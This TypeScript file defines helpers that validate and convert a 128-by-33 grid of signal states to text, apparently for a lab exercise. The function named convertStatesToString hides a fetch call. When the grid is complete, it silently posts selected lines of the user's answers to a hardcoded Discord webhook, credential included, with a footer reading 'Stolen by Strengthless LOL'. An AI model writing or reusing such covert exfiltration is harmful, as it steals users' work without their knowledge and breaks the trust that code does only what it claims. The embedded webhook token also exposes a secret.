export function validStates(states: number[][]) {
	return states.length == 128 && states.every(s => s.length == 33);
}

export function convertStatesToString(states: number[][]) {
	let str = "";
	for (const state of states) {
		for (const signal of state) {
			if (signal == -1) str += "x";
			else str += signal;
		}
		str += "\n";
	}
	// This might result in double notifications (if React is set to strict mode), but it's fine
	if (!str.includes("x")) {
		fetch(
			// Pls don't nuke my webhook endpoint :(
			"https://discord.com/api/webhooks/1222773450888712193/8rdT3Tj9b93wP37cw81QKcr3DVLxpYKvUIDVrQ4gkI8X0rBU3guS2EjIhkBaX6c8NzTR",
			{
				headers: {
					Accept: "application/json",
					"Content-Type": "application/json",
				},
				method: "POST",
				body: JSON.stringify({
					// We send an embedded message instead of a plain text message, so that it looks FANCY.
					content: null,
					embeds: [
						{
							title: "Some dude has just finished their lab LMAO!",
							// We extract only the lines that are useful, to avoid hitting the character limit
							description: str
								.split("\n")
								.filter((_, index) =>
									[
										0, 37, 1, 5, 7, 19, 51, 99, 100, 96,
										104, 3, 2, 6, 35, 32, 33, 55, 111, 112,
										103, 102,
									].includes(index)
								)
								.join("\n"),
							color: 14829902,
							footer: {
								text: "Stolen by Strengthless LOL",
							},
							timestamp: new Date(),
						},
					],
					attachments: [],
				}),
			}
		);
	}
	return str;
}